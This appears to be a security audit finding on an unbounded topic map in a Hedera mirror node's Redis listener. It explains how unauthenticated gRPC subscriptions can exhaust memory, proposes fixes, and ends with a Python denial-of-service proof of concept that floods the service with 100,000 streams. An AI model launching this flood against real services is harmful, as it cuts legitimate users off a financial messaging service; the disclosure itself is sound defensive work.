### Title
Unbounded `topicMessages` ConcurrentHashMap in `RedisTopicListener` Enables Unauthenticated Resource Exhaustion / OOM DoS

### Summary
`RedisTopicListener` maintains an unbounded `ConcurrentHashMap<String, Flux<TopicMessage>>` keyed by topic channel name. Any unauthenticated caller can open arbitrarily many long-lived gRPC `subscribeTopic` streams, each with a distinct topic ID, causing the map to grow without limit. Each entry also holds a live Redis pub/sub channel subscription, compounding memory and connection exhaustion until the JVM crashes, severing all active subscriber connections.

### Finding Description

**Exact code location:**

`RedisTopicListener.java` — map declared at line 43, populated at line 61:

```java
// Line 43
this.topicMessages = new ConcurrentHashMap<>();

// Lines 59-62
protected Flux<TopicMessage> getSharedListener(TopicMessageFilter filter) {
    Topic topic = getTopic(filter);
    return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
}
``` [1](#0-0) [2](#0-1) 

**Root cause:** The map has no capacity bound, no eviction policy, and no per-client or global subscription count limit. The key is derived directly from the caller-supplied `topicId`:

```java
// Line 65
return ChannelTopic.of(String.format("topic.%d", filter.getTopicId().getId()));
``` [3](#0-2) 

**Exploit flow:**

1. Attacker opens N concurrent gRPC streams to `subscribeTopic`, each with a distinct `topicId` (topics need not exist on-chain — `TopicMessageFilter` only validates `@NotNull` and time constraints, not topic existence). [4](#0-3) 
2. Each distinct topic ID triggers `computeIfAbsent` → `subscribe(topic)` → a new `.share()` Flux backed by a live Redis pub/sub channel subscription via `r.receive(...)`. [5](#0-4) 
3. Map entries are only removed in `unsubscribe`, which fires on `doOnCancel` / `doOnComplete` — i.e., only when the **last** subscriber to that topic disconnects. While the attacker holds connections open, entries are permanent. [6](#0-5) 
4. Each map entry carries: a `String` key, a `Flux` reactive chain with retry state, and a live Redis pub/sub subscription. Thousands of entries exhaust heap and Redis connection resources.

**Why existing checks fail:**

- `ListenerProperties.maxBufferSize` (16384) caps the per-subscription backpressure buffer, not the number of subscriptions. [7](#0-6) 
- `SharedTopicListener.listen()` applies no rate limiting, no per-IP cap, and no global subscription ceiling. [8](#0-7) 
- `ListenerProperties` has no field for maximum concurrent topics or subscriptions. [9](#0-8) 

### Impact Explanation
When the JVM OOM-crashes (or Redis exhausts connections), **all** active gRPC streams are terminated simultaneously. Legitimate subscribers monitoring financial topics (HCS-based token transfers, payment confirmations) lose their connections and miss messages during the outage window. Recovery requires a full service restart. Severity: **High** (availability impact on a financial messaging service).

### Likelihood Explanation
The gRPC mirror node endpoint is publicly accessible by design. No authentication is required to call `subscribeTopic`. An attacker needs only a gRPC client library and the ability to open many concurrent streams — trivially achievable with a single machine and a script. Hedera topic IDs are 64-bit integers, giving an effectively unlimited keyspace. The attack is repeatable: after a restart, the attacker can immediately re-trigger it.

### Recommendation

1. **Bound the map**: Replace `ConcurrentHashMap` with a size-limited structure (e.g., Caffeine cache with a max-entries eviction policy) so old/idle topic subscriptions are evicted automatically.
2. **Add a global subscription cap**: Add a `maxTopics` field to `ListenerProperties` and enforce it in `getSharedListener` before calling `computeIfAbsent`.
3. **Per-client rate limiting**: Enforce a maximum number of concurrent streams per source IP at the gRPC interceptor layer.
4. **Validate topic existence**: Reject `subscribeTopic` requests for topic IDs that do not exist in the mirror node database before creating a Redis subscription.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from com.hederahashgraph.api.proto.java import basic_types_pb2

MIRROR_NODE = "mirror.node.host:5600"

def subscribe(topic_num):
    channel = grpc.insecure_channel(MIRROR_NODE)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=topic_num),
        consensusStartTime=...
    )
    # Hold the stream open indefinitely
    for _ in stub.subscribeTopic(req):
        pass

threads = []
for i in range(1, 100_000):          # 100k distinct topic IDs
    t = threading.Thread(target=subscribe, args=(i,))
    t.daemon = True
    t.start()
    threads.append(t)

for t in threads:
    t.join()
# Each distinct i causes a new ConcurrentHashMap entry + Redis subscription.
# Service OOMs or Redis exhausts connections.
```

    private Flux<TopicMessage> subscribe(Topic topic) {
        Duration interval = listenerProperties.getInterval();

        return container
                .flatMapMany(r -> r.receive(Collections.singletonList(topic), channelSerializer, messageSerializer))
                .map(Message::getMessage)
                .doOnCancel(() -> unsubscribe(topic))
                .doOnComplete(() -> unsubscribe(topic))
                .doOnError(t -> log.error("Error listening for messages", t))
                .doOnSubscribe(s -> log.info("Creating shared subscription to {}", topic))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, interval).maxBackoff(interval.multipliedBy(4L)))
                .share();
```
